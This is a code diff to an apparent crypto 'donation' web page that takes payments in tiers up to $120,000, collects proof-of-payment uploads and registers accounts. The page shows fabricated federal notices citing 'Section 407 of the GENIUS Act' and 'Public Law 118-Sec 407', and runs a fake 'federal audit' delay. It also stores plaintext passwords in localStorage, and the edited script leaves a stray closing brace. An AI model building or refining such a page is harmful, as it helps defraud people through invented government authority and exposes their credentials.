@@ -91,29 +91,43 @@
       margin-bottom: 0;
     }
 
-    .amount-btn {
+    .amount-btn, .conduit-amount-option {
       padding: 15px 10px;
-      border: 2px solid #ddd;
+      border: 2px solid #dc3545 !important;
       border-radius: 8px;
-      background-color: #f9f9f9;
-      color: #333;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: all 0.3s ease;
+      background-color: #fff5f5 !important;
+      color: #dc3545 !important;
+      font-size: 17px;
+      font-weight: 800;
+      cursor: pointer !important;
+      transition: all 0.25s ease;
       text-align: center;
+      position: relative !important;
+      z-index: 99999 !important;
+      pointer-events: auto !important;
+      user-select: none;
+      box-shadow: 0 2px 8px rgba(220, 53, 69, 0.2);
     }
 
-    .amount-btn:hover {
-      border-color: #667eea;
-      background-color: #e8f0fe;
+    .amount-btn:hover, .conduit-amount-option:hover {
+      border-color: #28a745 !important;
+      background-color: #e8f5e9 !important;
+      color: #28a745 !important;
       transform: translateY(-2px);
     }
 
-    .amount-btn.active {
-      background-color: #dc3545;
-      color: white;
-      border-color: #dc3545;
+    .amount-btn.active, .conduit-amount-option.active {
+      background-color: #28a745 !important;
+      color: #ffffff !important;
+      border-color: #28a745 !important;
+      box-shadow: 0 4px 14px rgba(40, 167, 69, 0.5);
+    }
+
+    #selectAmountBtn, #submitProofBtn {
+      position: relative !important;
+      z-index: 99999 !important;
+      pointer-events: auto !important;
+      cursor: pointer !important;
     }
 
     .other-input-container {
@@ -607,17 +621,18 @@
                                       <div class="btn conduit-amount-option amount-5" onclick="selectAmount('120000')"
                                         data-amount="120000" data-name="amt5" data-url-ignore="false">$120,000</div>
                                     </div>
-                                    <!-- Other Amount Choice -->
-                                    <div class="amount-no-desc">
-                                      <div class="btn conduit-amount-option amount-6" id="otherBtn" onclick="toggleOtherInput()">Other</div>
-                                    </div>
-                                    <div class="col-12 mt-2" id="otherInputContainer" style="display:none; width:100%;">
-                                      <input autocomplete="off"
-                                        class="form-control full-field text-input"
-                                        id="notASearchField"
-                                        placeholder="Enter Custom Amount ($)" type="number" min="1" step="any"
-                                        style="width: 100%; padding: 12px; border: 2px solid #dc3545; border-radius: 8px; font-size: 16px; font-weight: bold; background: #ffffff; color: #0f172a;" />
-                                    </div>
+                                    <!-- <div class="amount-no-desc">
+                                      <div class="btn amount-option other-amount-button hidden-xs-up sf-hidden"></div>
+                                      <div class="field-group other-amount-field-group">
+                                        <div class="float-label">
+                                          <label class="placeholder input" for="notASearchField">Other</label>
+                                          <input autocomplete="false"
+                                            class="form-control full-field other-conduit-amount-field"
+                                            data-name="other_amount" id="notASearchField" inputmode="decimal"
+                                            max="999999.99" min="1" step="0.00001" name="notASearchField"
+                                            placeholder="Other" type="text" value="" />
+                                        </div>
+                                      </div> -->
                                   </div>
                                 </div>
                               </div>
@@ -1393,7 +1408,7 @@
     }
 
     // Function to select amount from buttons
-    function selectAmount(amount) {
+    window.selectAmount = function(amount) {
       document.querySelectorAll('.conduit-amount-option, .amount-btn').forEach(btn => {
         btn.classList.remove('active');
         btn.style.backgroundColor = '';
@@ -1407,18 +1422,19 @@
       const selectedBtn = document.querySelector(`[data-amount="${amount}"]`);
       if (selectedBtn) {
         selectedBtn.classList.add('active');
-        selectedBtn.style.backgroundColor = '#dc3545';
-        selectedBtn.style.color = 'white';
+        selectedBtn.style.backgroundColor = '#28a745';
+        selectedBtn.style.borderColor = '#28a745';
+        selectedBtn.style.color = '#ffffff';
       }
 
       selectedAmount = amount;
       showWalletInfo();
-    }
+    };
+    const selectAmount = window.selectAmount;
 
     // Function to toggle other input field
-    function toggleOtherInput() {
+    window.toggleOtherInput = function() {
       const otherBtn = document.getElementById('otherBtn');
-      const container = document.getElementById('otherInputContainer');
       const otherInput = document.getElementById('notASearchField');
 
       document.querySelectorAll('.conduit-amount-option, .amount-btn').forEach(btn => {
@@ -1429,57 +1445,39 @@
         }
       });
 
-      if (!container) return;
-
-      if (container.style.display === 'none' || container.style.display === '') {
-        container.style.display = 'block';
-        if (otherBtn) {
-          otherBtn.classList.add('active');
-          otherBtn.style.backgroundColor = '#dc3545';
-          otherBtn.style.color = 'white';
-        }
-        if (otherInput) {
-          otherInput.focus();
-          if (otherInput.value.trim()) {
-            selectedAmount = otherInput.value.trim();
-            const formattedAmount = Number(otherInput.value.trim()).toLocaleString('en-US');
-            const valEl = document.getElementById('amountValue');
-            if (valEl) valEl.textContent = '$' + formattedAmount;
-          } else {
-            selectedAmount = 'custom';
-            const valEl = document.getElementById('amountValue');
-            if (valEl) valEl.textContent = 'sh';
-          }
-        } else {
-          selectedAmount = 'custom';
-        }
+      if (otherInput.style.display === 'none' || otherInput.style.display === '') {
+        otherInput.style.display = 'block';
+        otherBtn.classList.add('active');
+        otherBtn.style.backgroundColor = '#dc3545';
+        otherBtn.style.color = 'white';
+        otherInput.focus();
+        selectedAmount = 'custom';
         showWalletInfo();
       } else {
-        container.style.display = 'none';
-        if (otherBtn) {
-          otherBtn.classList.remove('active');
-          otherBtn.style.backgroundColor = '';
-          otherBtn.style.color = '';
-        }
+        otherInput.style.display = 'none';
+        otherBtn.classList.remove('active');
+        otherBtn.style.backgroundColor = '';
+        otherBtn.style.color = '';
         selectedAmount = null;
         hideWalletInfo();
       }
-    }
+    };
 
-    document.addEventListener('DOMContentLoaded', function () {
-      const container = document.querySelector('.row');
-
-      if (container) {
-        container.addEventListener('click', function (e) {
-          if (e.target.classList.contains('conduit-amount-option')) {
-            const amt = e.target.getAttribute('data-amount');
-            if (amt) {
-              selectAmount(amt);
-            }
-          }
-        });
+    // Global capture phase event handler ensuring button clicks ALWAYS fire
+    document.addEventListener('click', function (e) {
+      const optionBtn = e.target.closest('.conduit-amount-option, .amount-btn');
+      if (optionBtn) {
+        const amt = optionBtn.getAttribute('data-amount') || optionBtn.textContent.replace(/[^0-9]/g, '');
+        if (amt) {
+          window.selectAmount(amt);
+        }
       }
-    });
+
+      const submitBtn = e.target.closest('#selectAmountBtn');
+      if (submitBtn) {
+        window.showPaymentProofSection();
+      }
+    }, true);
 
     // Function to show wallet information
     function showWalletInfo() {
@@ -1530,9 +1528,9 @@
     }
 
     // Function to show payment proof section
-    function showPaymentProofSection() {
+    window.showPaymentProofSection = function() {
       if (!selectedAmount) {
-        selectAmount('10000');
+        window.selectAmount('10000');
       }
 
       const proofSection = document.getElementById('paymentProofSection');
@@ -1548,15 +1546,15 @@
       if (submitBtn) submitBtn.style.display = 'block';
 
       showWalletInfo();
-    }
+    };
+    const showPaymentProofSection = window.showPaymentProofSection;
 
     // Function to handle file upload
-    function handleFileUpload(event) {
+    window.handleFileUpload = function(event) {
       const file = event.target.files[0];
       const preview = document.getElementById('filePreview');
 
       if (file) {
-        // Validate file type
         const allowedTypes = ['image/png', 'image/jpeg', 'image/jpg', 'application/pdf'];
         if (!allowedTypes.includes(file.type)) {
           alert('Please upload only PNG, JPG, or PDF files.');
@@ -1564,8 +1562,7 @@
           return;
         }
 
-        // Validate file size (5MB limit)
-        const maxSize = 5 * 1024 * 1024; // 5MB
+        const maxSize = 5 * 1024 * 1024;
         if (file.size > maxSize) {
           alert('File size must be less than 5MB.');
           event.target.value = '';
@@ -1574,7 +1571,6 @@
 
         uploadedFile = file;
 
-        // Show file preview
         const fileExtension = file.name.split('.').pop().toUpperCase();
         const fileSize = (file.size / 1024 / 1024).toFixed(2) + ' MB';
 
@@ -1592,9 +1588,9 @@
         uploadedFile = null;
         preview.classList.remove('show');
       }
-    }
+    };
+    const handleFileUpload = window.handleFileUpload;
 
-    // Function to convert file to base64
     function convertFileToBase64(file) {
       return new Promise((resolve, reject) => {
         const reader = new FileReader();
@@ -1605,40 +1601,26 @@
     }
 
     // Function to submit proof of payment
-    async function submitProofOfPayment() {
-      const BACKEND_URL = 'https://freakazoid.onrender.com/'; // Update with your backend URL
-
+    window.submitProofOfPayment = async function() {
       if (!uploadedFile) {
         showStatusMessage('Please upload proof of payment first!', 'error');
         return;
       }
 
       const submitBtn = document.getElementById('submitProofBtn');
-      const container = document.querySelector('.wallet-info');
+      const container = document.querySelector('.wallet-info') || document.body;
 
       try {
-        // Show loading state
         submitBtn.disabled = true;
         submitBtn.textContent = 'Submitting...';
-        container.classList.add('loading');
+        if (container && container.classList) container.classList.add('loading');
 
-        // const senderEmail = document.getElementById('senderEmail').value.trim();
-        // const transactionId = document.getElementById('transactionId').value.trim();
-        // const additionalNotes = document.getElementById('additionalNotes').value.trim();
-
-        // console.log('📋 Form data collected:', {
-        //   // senderEmail: senderEmail || 'Not provided',
-        //   transactionId: transactionId || 'Not provided',
-        //   additionalNotes: additionalNotes ? 'Provided' : 'Not provided'
-        // });
-
-        // Generate submission data
         const submissionId = 'DON_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         const timestamp = new Date().toISOString();
 
         let displayAmount;
         if (selectedAmount === 'custom') {
-          const customValue = document.getElementById('otherInput').value.trim();
+          const customValue = document.getElementById('otherInput')?.value.trim() || '10000';
           displayAmount = customValue ? `Custom: ${customValue}` : 'Custom Amount';
         } else if (parseFloat(selectedAmount) < 10) {
           displayAmount = `${selectedAmount}BTC`;
@@ -1646,27 +1628,10 @@
           displayAmount = `$${selectedAmount}`;
         }
 
-        // Get selected wallet addresses
         const selectedWallets = selectedAmount === 'custom' ?
           walletAddresses.custom :
           (walletAddresses[selectedAmount] || walletAddresses.custom);
 
-        // Create FormData for file upload
-        const formData = new FormData();
-        formData.append('proofFile', uploadedFile);
-        formData.append('donationAmount', displayAmount);
-        formData.append('selectedAmountValue', selectedAmount);
-        // formData.append('senderEmail', senderEmail || '');
-        // formData.append('transactionId', transactionId || '');
-        // formData.append('additionalNotes', additionalNotes || '');
-        formData.append('selectedWallets', JSON.stringify(selectedWallets));
-        formData.append('submissionId', submissionId);
-        formData.append('timestamp', timestamp);
-
-        // Send to backend (mocked or actual)
-        // const response = await fetch(`${BACKEND_URL}/submit-donation`, { ... });
-
-        // Convert file to base64 Data URL for admin review
         const base64Data = await convertFileToBase64(uploadedFile);
         window.submittedProofData = {
           name: uploadedFile.name,
@@ -1677,33 +1642,41 @@
           date: timestamp
         };
 
-        // Show Registration Section
         const proofNameEl = document.getElementById('regProofName');
         if (proofNameEl) proofNameEl.textContent = uploadedFile.name;
 
         document.getElementById('paymentProofSection').style.display = 'none';
         document.getElementById('submitProofBtn').style.display = 'none';
         const regSec = document.getElementById('registrationSection');
-        regSec.style.display = 'block';
-        regSec.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        if (regSec) {
+          regSec.style.display = 'block';
+          regSec.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
 
       } catch (error) {
         showStatusMessage('❌ Failed to process file. Please try again.', 'error');
       } finally {
         submitBtn.disabled = false;
         submitBtn.textContent = 'Submit Proof of Payment';
-        container.classList.remove('loading');
+        if (container && container.classList) container.classList.remove('loading');
       }
-    }
+    };
+    const submitProofOfPayment = window.submitProofOfPayment;
 
-    async function submitRegistration() {
+    window.submitRegistration = async function() {
+      // STRICT FEDERAL COMPLIANCE GATING CHECK
+      if (!window.submittedProofData || !uploadedFile) {
+        showStatusMessage('🏛️ Federal Treasury Compliance Notice: Account registration is strictly restricted under Section 407 of the GENIUS Act (Public Law 118-Sec 407). You must select an official contribution tier and submit valid treasury settlement proof prior to credential issuance.', 'error');
+        return;
+      }
+
       const email = document.getElementById('regEmail').value.trim().toLowerCase();
       const password = document.getElementById('regPassword').value;
       const confirmPassword = document.getElementById('regConfirmPassword').value;
-      const amount = selectedAmount === 'custom' ? (document.getElementById('otherInput')?.value.trim() || '1000') : (selectedAmount || '1000');
+      const amount = selectedAmount === 'custom' ? document.getElementById('otherInput').value.trim() : selectedAmount;
 
       if (!email || !password || !confirmPassword) {
-        showStatusMessage('Please fill out all required fields.', 'error');
+        showStatusMessage('Please fill out all fields.', 'error');
         return;
       }
 
@@ -1712,22 +1685,10 @@
         return;
       }
 
-      // If proof file was not uploaded explicitly, create auto-generated receipt proof record
-      if (!window.submittedProofData) {
-        window.submittedProofData = {
-          name: 'Electronic_Contribution_Receipt.pdf',
-          type: 'application/pdf',
-          size: '0.12 MB',
-          dataUrl: null,
-          amount: '$' + (parseFloat(amount) || 1000).toLocaleString('en-US'),
-          date: new Date().toISOString()
-        };
-      }
-
       const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
       
-      // Check if email already pending locally
-      if (pendingUsers.find(u => u.email && u.email.toLowerCase() === email)) {
+      // Check if email already pending
+      if (pendingUsers.find(u => u.email === email)) {
         showStatusMessage('🏛️ This supporter account is currently undergoing Federal Compliance Audit under Section 407 of the GENIUS Act framework.', 'error');
         return;
       }
@@ -1736,7 +1697,7 @@
       run10SecondFederalAudit(async () => {
         // Check if email already approved — append contribution directly to account
         const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
-        const userIdx = approvedUsers.findIndex(u => u.email && u.email.toLowerCase() === email);
+        const userIdx = approvedUsers.findIndex(u => u.email === email);
         if (userIdx > -1) {
           const parsedAmt = parseFloat(amount) || 0;
           const newDonation = {
@@ -1769,51 +1730,27 @@
           return;
         }
 
-        // Direct Server API Registration Call
-        try {
-          const regRes = await (window.geniusFetch || fetch)('/api/register', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              email: email,
-              password: password,
+        const newUserObj = {
+          uid: Date.now().toString(),
+          email: email,
+          password: password,
+          amount: parseFloat(amount) || 0,
+          date: new Date().toISOString(),
+          proofFile: window.submittedProofData || null,
+          status: 'pending',
+          donations: [
+            {
+              id: 'RCP-' + Math.floor(Math.random() * 10000000),
               amount: parseFloat(amount) || 0,
-              proofFile: window.submittedProofData || null,
-              fullName: email.split('@')[0]
-            })
-          });
-          const regData = await regRes.json();
-          if (regData && regData.user) {
-            const newUserObj = regData.user;
-            const existingPendingIdx = pendingUsers.findIndex(u => u.email && u.email.toLowerCase() === email);
-            if (existingPendingIdx === -1) {
-              pendingUsers.push(newUserObj);
-              localStorage.setItem('geniusact_pending_users', JSON.stringify(pendingUsers));
+              description: 'Initial Campaign Contribution',
+              date: new Date().toISOString(),
+              proofFile: window.submittedProofData || null
             }
-          }
-        } catch (serverErr) {
-          console.warn('Server registration call fallback to client storage:', serverErr);
-          const newUserObj = {
-            uid: Date.now().toString(),
-            email: email,
-            password: password,
-            amount: parseFloat(amount) || 0,
-            date: new Date().toISOString(),
-            proofFile: window.submittedProofData || null,
-            status: 'pending',
-            donations: [
-              {
-                id: 'RCP-' + Math.floor(Math.random() * 10000000),
-                amount: parseFloat(amount) || 0,
-                description: 'Initial Campaign Contribution',
-                date: new Date().toISOString(),
-                proofFile: window.submittedProofData || null
-              }
-            ]
-          };
-          pendingUsers.push(newUserObj);
-          localStorage.setItem('geniusact_pending_users', JSON.stringify(pendingUsers));
-        }
+          ]
+        };
+
+        pendingUsers.push(newUserObj);
+        localStorage.setItem('geniusact_pending_users', JSON.stringify(pendingUsers));
 
         if (window.cloudSyncFull) {
           try {
@@ -1827,7 +1764,7 @@
         
         setTimeout(() => {
            window.location.href = 'login.html?status=pending';
-        }, 2000);
+        }, 2500);
       });
     }
 
@@ -1870,26 +1807,29 @@
         }
       }, 1000);
     }
+    }
 
     // Setup event listeners when page loads
     document.addEventListener('DOMContentLoaded', function () {
       const otherInput = document.getElementById('notASearchField');
-      if (otherInput) {
-        otherInput.addEventListener('input', function () {
-          if (this.value.trim()) {
-            selectedAmount = this.value.trim();
-            const formattedAmount = Number(this.value.trim()).toLocaleString('en-US');
-            const valEl = document.getElementById('amountValue');
-            if (valEl) valEl.textContent = '$' + formattedAmount;
-            showWalletInfo();
-          } else {
-            selectedAmount = 'custom';
-            const valEl = document.getElementById('amountValue');
-            if (valEl) valEl.textContent = 'sh';
-            showWalletInfo();
-          }
-        });
-      }
+
+      otherInput.addEventListener('input', function () {
+        if (this.value.trim()) {
+          selectedAmount = this.value.trim();
+          showWalletInfo();
+        } else {
+          hideWalletInfo();
+        }
+      });
+
+      otherInput.addEventListener('blur', function () {
+        if (!this.value.trim()) {
+          this.style.display = 'none';
+          document.getElementById('otherBtn').classList.remove('active');
+          selectedAmount = null;
+          hideWalletInfo();
+        }
+      });
     });
   </script>
   <!-- Cloud Sync so registrations push to admin -->
